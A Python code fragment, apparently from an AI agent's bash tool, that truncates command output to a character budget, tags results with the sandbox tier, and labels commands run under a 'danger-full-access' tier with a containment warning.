            remaining = MAX_OUTPUT_CHARS - len(err) - err_overhead
            if remaining < 2000 and err:
                # stderr consumed most budget — truncate stderr further
                remaining = MAX_OUTPUT_CHARS // 2
                err = err[:remaining] + (
                    "\n\n... [stderr truncated to make room for stdout]"
                )

            if out and len(out) > remaining:
                head_chars = int(remaining * HEAD_TAIL_RATIO)
                tail_chars = remaining - head_chars - 200  # message overhead
                if tail_chars < 500:
                    out = out[:remaining - 50] + (
                        f"\n\n... [stdout truncated: {len(out)} → {remaining} chars]"
                    )
                else:
                    out = (
                        f"{out[:head_chars]}\n\n"
                        f"... [{len(out) - remaining} chars omitted] ..."
                        f"\n\n{out[-tail_chars:]}"
                    )

            parts: list[str] = []
            if out:
                parts.append(out)
            if err:
                parts.append(f"[stderr]\n{err}")
            if not parts:
                parts.append("(no output)")
            result = "\n".join(parts)
            if sandbox_tag:
                result = f"{sandbox_tag} ok\n{result}"
            if containment_warning:
                result += (
                    f"\n⚠️ [sandbox:danger-full-access] {containment_warning} "
                    "— executed anyway (danger tier opts into no blocking)"
                )
            return ToolResult(name="bash", content=result)
        except FileNotFoundError:
            return ToolResult(
                name="bash",
                content=f"Command not found: {cmd[:100]}",
                error=True,
            )
        except OSError as e:
            logger.warning("bash error: %s", e)
            return ToolResult(name="bash", content=f"Error: {e}", error=True)
